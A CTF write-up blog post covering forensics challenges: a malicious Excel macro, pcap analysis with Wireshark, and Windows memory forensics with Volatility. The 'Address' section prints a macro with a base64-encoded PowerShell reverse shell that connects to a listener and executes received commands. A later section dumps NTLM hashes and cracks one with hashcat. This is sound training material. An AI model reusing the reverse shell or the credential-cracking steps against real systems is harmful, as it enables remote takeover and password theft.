---
title: "SheHacks Intervarsity CTF 2023 - USIU"
date: 2023-09-24 11:30:00 +0300
image: /assets/img/Posts/shehacks.png
categories: [shehacks, CTF]
tags: [Forensic, Android, Reverse Engineering]
---

This year's SheHacks intervarsity CTF was held in USIU, organized by SheHacks team and a few other sponsors. Challenges created by ChasingFlags. Took a few bros from my uni to team up and play the CTF. Here are the write ups for the different challenges i was able to solve.

## Forensic category
## Address
> Find the ip and port called by the malicious script. Flag format: SHCTFf{ip:port}

In this challenge we were given an excel file [books.xls](/assets/img/Posts/shehacks/address/books.xls) to and asked to find the IP and port. well, we have been told it is malicious, what into my mind is that, the shared .xls might have some malicous VBA scripts, we can use `strings` or `olevba` in oletools to view the injected code.

```vb
Sub Auto_Run()
Call Shell(“ “”,0"””, vbHide)
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAyADcALgAwAC4AMAAuADEAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAd
ABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA “”,0"””, vbHide)
End Sub
```
we find a base64 encode string meant to be executed by powershell. we can proceed to decode it. and get the IP and port.

![image](/assets/img/Posts/shehacks/address/address.png)

*SHCTF{127.0.0.1:9001}*

## SnifferDog1
> How many packets in total passed through port 445 shctf{Ans}

Given the pcap file [snifferdog.pcap](/assets/img/Posts/shehacks/snifferdog/snifferdog.pcap), we can use wireshark to determine the number of packets by simply filtering by port 445 `tcp.port == 445` and viewing the value of the displayed packets in the bottom right of the wireshark window.

![image](/assets/img/Posts/shehacks/snifferdog/packets.png)

*shctf{10638}*

## Snifferdog2
> What is the 6th disallowed item listed in http://192.168.56.103:8081/robots.txt?

in this, we use the same pcap file shared, what we do is filter the packets to the address `192.168.56.103`, port `8081` and the `http` protocol.

`ip.addr == 192.168.56.103 and tcp.port == 8081 and http` and searching for robots.txt in the `packets list`.

![image](/assets/img/Posts/shehacks/snifferdog/robots.png)

then right click and follow http stream. we get repost of the GET /robots.txt with several disallow entries, we get the 6th as our flag.

![image](/assets/img/Posts/shehacks/snifferdog/robots1.png)

*shctf{/installion/}*

## Snifferdog3
> What version of Jenkins is running on 192.168.56.103? shctf{VersionOnly}

We filter with the IP address `192.168.56.103` and then in the packet details, search for jenkins.

![image](/assets/img/Posts/shehacks/snifferdog/jenkins.png)

OR

> You can just string the pcap file and grep for jenkins:)
`strings snifferdog.pcap | grep "jenkins"` and check through, you find the version.

*shctf{1.647}*

## Snifferdog4
> What is the domain SID for 192.168.56.103 shctf{S...}

A domain SID or security identifier is used to uniquely identify a security principal or secuirty group. Security principals can represent any entity that can be authenticated by an operating system. You can more about security identifiers [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers).

So we are looking for something with S-1-..........we filter by the ip address and search in the packet details, the first chars of the SID.

![image](/assets/img/Posts/shehacks/snifferdog/sid.png)

*shctf{S-1-5-21-2950693484-2233299975-203034155}*

## Infected1
This was the start of the infected series.

>The incidence response team of Company A found a rogue laptop under one of their sales representative’s desk. They have contacted you as their Forensic expert to analyse the device link.
**Find the laptop's last shutdown time.**

the file given to us is a memory dump .vmem, first obvious tool we think of is `volatility`. Download it from [here](https://www.volatilityfoundation.org/releases).

Unzip the `.7z` file using
`7z e filename.7z`

Then we check on the right profile based on the information of the operating system from which the memory dump was taken from. `Volatility` identifies the system the memory image was taken from, including the operating system, version, and architecture and suggest to us the recommended profile. We are going to use `imageinfo` plugin.

`./volatility_2.6_lin64_standalone -f ../Execise1.vmem imageinfo`

```
➜  volatility_2.6_lin64_standalone ./volatility_2.6_lin64_standalone -f ../Execise1.vmem imageinfo                        
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/prorat/hacks/shehacks/forensics/infected/Execise1.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a4e0a0L
          Number of Processors : 4
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a4fd00L
                KPCR for CPU 1 : 0xfffff880009ef000L
                KPCR for CPU 2 : 0xfffff88002f69000L
                KPCR for CPU 3 : 0xfffff88002fdf000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2023-09-11 15:47:04 UTC+0000
     Image local date and time : 2023-09-11 18:47:04 +0300

```

based on the output, we will be using `Win7SP1x64`. Every time we run volatility querrying anything, it is important we make sure the `--profile=Win7SP1x64` is included.

Coming back to the question, we are asked to sumbit the `last shutdown time`. So we make use of the `shutdowntime` plugin.

![image](/assets/img/Posts/shehacks/infected/shutdowntime.png)

## Infected2
>A malicious exe was running on the machine, identify it's process id and time it was last ran format `SHCTF{pid:1997-01-10 00:00:00}`.

For these chall, we will need to be aware of the different processes and their child processes. It is by that we can spot a malicious process that seems to spawn other processes it shouldn't. `i.e. lssas.exe running`. well this is might be malicious process cratfed to mimic the name of a legitimate proccess `lsass.exe` to confuse the user or the investor from spoting or flaging it.

There are different plugins we can use, but for a better view, we can use `pstree`.

```
➜  volatility_2.6_lin64_standalone ./volatility_2.6_lin64_standalone --profile=Win7SP1x64 -f ../Execise1.vmem pstree                  
Volatility Foundation Volatility Framework 2.6
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xfffffa8018dacb30:csrss.exe                         384    372     11    776 2023-09-12 00:31:18 UTC+0000
. 0xfffffa801a335060:conhost.exe                     4536    384      2     48 2023-09-11 15:42:15 UTC+0000
. 0xfffffa801aefeb30:conhost.exe                     4808    384      2     49 2023-09-11 15:42:35 UTC+0000
. 0xfffffa8019402700:conhost.exe                      464    384      2     52 2023-09-11 14:38:10 UTC+0000
 0xfffffa801b071b30:winlogon.exe                      428    372      5    134 2023-09-12 00:31:18 UTC+0000
 0xfffffa801929c330:AnyDesk.exe                      2112   3844      0 ------ 2023-09-11 14:47:51 UTC+0000
 0xfffffa8018d3f890:System                              4      0    102    542 2023-09-12 00:31:15 UTC+0000
. 0xfffffa801a560a90:smss.exe                         248      4      2     32 2023-09-12 00:31:15 UTC+0000
 0xfffffa80194ff9e0:firefox.exe                      2104   1196     78   1428 2023-09-11 14:40:36 UTC+0000
. 0xfffffa80194889e0:firefox.exe                     3720   2104     23    272 2023-09-11 14:40:38 UTC+0000
. 0xfffffa801a4743d0:firefox.exe                     3244   2104      6    148 2023-09-11 14:40:36 UTC+0000
. 0xfffffa801949b300:firefox.exe                     6464   2104     14    229 2023-09-11 15:22:29 UTC+0000
. 0xfffffa801a47e3c0:firefox.exe                     3332   2104      6    142 2023-09-11 14:40:36 UTC+0000
. 0xfffffa801afc7060:firefox.exe                     4604   2104     24    276 2023-09-11 15:07:53 UTC+0000
. 0xfffffa80190d7200:firefox.exe                     5020   2104     14    230 2023-09-11 15:40:26 UTC+0000
. 0xfffffa801a56f6b0:firefox.exe                     1332   2104      6    161 2023-09-11 14:40:36 UTC+0000
. 0xfffffa801a2dc410:firefox.exe                     5836   2104     22    261 2023-09-11 15:19:27 UTC+0000
. 0xfffffa801af07210:firefox.exe                     5216   2104     22    261 2023-09-11 15:22:26 UTC+0000
. 0xfffffa8019261630:firefox.exe                      764   2104     37    370 2023-09-11 14:40:36 UTC+0000
. 0xfffffa801aef8270:firefox.exe                     7152   2104     14    231 2023-09-11 15:22:37 UTC+0000
. 0xfffffa801a1cc060:firefox.exe                     3324   2104      6    146 2023-09-11 14:40:36 UTC+0000
. 0xfffffa8019527310:firefox.exe                     3128   2104     22    261 2023-09-11 14:40:36 UTC+0000
 0xfffffa801acd7060:csrss.exe                         332    324     10    365 2023-09-12 00:31:17 UTC+0000
 0xfffffa8018de9600:wininit.exe                       360    324      3     78 2023-09-12 00:31:18 UTC+0000
. 0xfffffa801b07f830:services.exe                     456    360      6    208 2023-09-12 00:31:18 UTC+0000
.. 0xfffffa801926e630:svchost.exe                    1036    456     11    341 2023-09-11 14:33:48 UTC+0000
.. 0xfffffa801a107420:taskhost.exe                   4612    456      5     96 2023-09-11 14:46:50 UTC+0000
.. 0xfffffa8019366a30:mscorsvw.exe                   1432    456      6    100 2023-09-11 14:33:47 UTC+0000
.. 0xfffffa801a0201e0:svchost.exe                     916    456     32   1168 2023-09-12 00:31:22 UTC+0000
.. 0xfffffa8019f94890:taskhost.exe                   1944    456      7    202 2023-09-11 14:33:02 UTC+0000
.. 0xfffffa801a22c630:svchost.exe                    1956    456     13    287 2023-09-11 14:32:43 UTC+0000
.. 0xfffffa801b1bd060:svchost.exe                     680    456      8    298 2023-09-12 00:31:18 UTC+0000
.. 0xfffffa801a140b30:spoolsv.exe                    1224    456     12    286 2023-09-12 00:31:46 UTC+0000
.. 0xfffffa8019620b30:AnyDesk.exe                    1480    456      6    230 2023-09-11 14:48:02 UTC+0000
.. 0xfffffa801a063730:svchost.exe                     696    456     15    541 2023-09-12 00:31:45 UTC+0000
.. 0xfffffa801a048b30:svchost.exe                     448    456     14    367 2023-09-12 00:31:45 UTC+0000
.. 0xfffffa8018e0eb30:svchost.exe                     964    456     19    504 2023-09-12 00:31:22 UTC+0000
.. 0xfffffa801b1d0b30:sppsvc.exe                      852    456      5    164 2023-09-12 00:31:20 UTC+0000
.. 0xfffffa801b174060:svchost.exe                     600    456      9    380 2023-09-12 00:31:18 UTC+0000
.. 0xfffffa801a148b30:svchost.exe                    1252    456     17    316 2023-09-12 00:31:46 UTC+0000
.. 0xfffffa80191ea430:mscorsvw.exe                   2408    456      7     97 2023-09-11 14:33:47 UTC+0000
.. 0xfffffa8019fdc060:svchost.exe                     892    456     18    440 2023-09-12 00:31:22 UTC+0000
... 0xfffffa8018ed3060:dwm.exe                       2004    892      3     74 2023-09-11 14:33:02 UTC+0000
.. 0xfffffa8019fb8770:SearchIndexer.                 2020    456     14    762 2023-09-11 14:32:43 UTC+0000
. 0xfffffa801b0d0b30:lsm.exe                          484    360      9    144 2023-09-12 00:31:18 UTC+0000
. 0xfffffa801b0a33b0:lsass.exe                        476    360      7    609 2023-09-12 00:31:18 UTC+0000
 0xfffffa8018f08b30:explorer.exe                     1616   2008     29   1073 2023-09-11 14:33:02 UTC+0000
. 0xfffffa8019451690:AnyDesk.exe                     4348   1616     10    210 2023-09-11 14:48:02 UTC+0000
. 0xfffffa80191c1060:AnyDesk.exe                     4380   1616     14    232 2023-09-11 14:48:02 UTC+0000
. 0xfffffa8019378060:cmd.exe                         2720   1616      1     20 2023-09-11 14:38:10 UTC+0000
. 0xfffffa801964ab30:MSASCui.exe                     4400   1616      9    147 2023-09-11 15:41:44 UTC+0000
. 0xfffffa8019ee5b30:dismissal_lett                  3008   1616      1     23 2023-09-11 15:42:35 UTC+0000
.. 0xfffffa801a4afb30:cmd.exe                        6944   3008      1     21 2023-09-11 15:42:35 UTC+0000
. 0xfffffa8019452060:notepad.exe                     4912   1616      1     61 2023-09-11 14:51:58 UTC+0000
. 0xfffffa801ad07b30:iexplore.exe                    5556   1616     10    424 2023-09-11 15:06:24 UTC+0000
.. 0xfffffa801af6c210:iexplore.exe                   5904   5556     10    381 2023-09-11 15:06:24 UTC+0000
. 0xfffffa801aedd4b0:dismissal_lett                  6528   1616      1     23 2023-09-11 15:42:15 UTC+0000
.. 0xfffffa801accc060:cmd.exe                        6260   6528      1     21 2023-09-11 15:42:15 UTC+0000
. 0xfffffa8018fb0ab0:regsvr32.exe                     788   1616      0 ------ 2023-09-11 14:33:03 UTC+0000
 0xfffffa8019457940:advanced_ip_sc                   1320   3496    107    749 2023-09-11 14:44:01 UTC+0000
 ```

From the above output, we spot a process `dismissal_lett` and based on it we structure someting like below;
```
 0xfffffa8018f08b30:explorer.exe                     1616   2008     29   1073 2023-09-11 14:33:02 UTC+0000
. 0xfffffa8019ee5b30:dismissal_lett                  3008   1616      1     23 2023-09-11 15:42:35 UTC+0000
.. 0xfffffa801a4afb30:cmd.exe                        6944   3008      1     21 2023-09-11 15:42:35 UTC+0000
```
`explorer.exe` is the parent process of what seems as a suspicious process (`dismissal_lett`). and the `dismissal_lett` seems to spawn a child process `cmd.exe`. it is by this we conclude that `dismissal_lett` with PID `3008` is the malicious process in question.

*SHCTF{3008:2023-09-11 15:42:35}*

## Infected3
>What is the name of the malicious file running the process and url link that was used to download the file format `SHCTF{file:http://url/file}`

Now that we know the malicious process, we can proceed to dump it using `memdump` plugin, use `-p` to put the PID and `-D` to provide the directory where the dump will be saved.

`/volatility_2.6_lin64_standalone --profile=Win7SP1x64 -f ../Execise1.vmem memdump -p 3008 -D dismiss_let`
![image](/assets/img/Posts/shehacks/infected/dismiss.png)

then we run `strings` on our dump then grep for our process as the keyword. we find the url and the complete name of the executable downloaded.

![image](/assets/img/Posts/shehacks/infected/dismiss-1.png)

*SHCTF{dismissal_letter.exe:http://192.168.75.128/dismissal_letter.exe}*

## Infected4
>Find Custom’s password

In this chall we utilize the `hashdump` plugin to dump the NTLM hashes of the users in the windows machine and then crack them using `hashcat`, `crackstation` or the famous `john the ripper`.

```bash
➜  volatility_2.6_lin64_standalone ./volatility_2.6_lin64_standalone --profile=Win7SP1x64 -f ../Execise1.vmem hashdump                      
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Custom:1000:aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76:::

```
Used hashcat command to crack the hash.

`hashcat -a 0 -m 1000 hash /usr/share/wordlists/rockyou.txt`

![image](/assets/img/Posts/shehacks/infected/pass.png)

*SHCTF{pass123}*

## Infected5
>A file was edited by the attacker, decipher the file content.

I was the only one who solved this chall:). Well, its not because i am much skilled but its because i was very keen on viewing the dump. with the help of below statement in the description `decipher the file content`, i was sure the flag was not something we could use strings and just get it, so i knew i was looking for something encrypted or encoded.

From the processes we see there was a notepad.exe. looks like this is the editor that was used to edit the file. I proceeded to dump the `notepad.exe` process.

Then used `strings` to dump the ascii chars then stored them on a file. Then opened it using the sublime text, my new favourite editor, thanks to john hammond :).

Then fuzzed the possible file extensions to see if i would find any.

![image](/assets/img/Posts/shehacks/infected/trial.png)

We confirmed indeed notepad was used to edit a file `trial.txt`.

Continued analyzing the dump contents by searching through using the keyword `trial.txt`. Came across a text string which looked encoded.

![image](/assets/img/Posts/shehacks/infected/trial-1.png)

Copied it went on to decode it using cyberchef with the magic recipe only to realize it was base64...ahahaaa.

![image](/assets/img/Posts/shehacks/infected/trial-2.png)

*SHCTF{G00d_Stuff!}*

Looked easy untill i saw no other player solve it, i knew it was difficult to spot.

## Rev category

### Veil Dimensions
>Dive deep into the virtual realm and remember, duality hides the truth. Seek where they intertwine, and the solution will emerge.

I used the intended path so ill just regirect you to the challenge creator's blog where is was explained better.

https://evalevanto.github.io/posts/veiled_dimensions/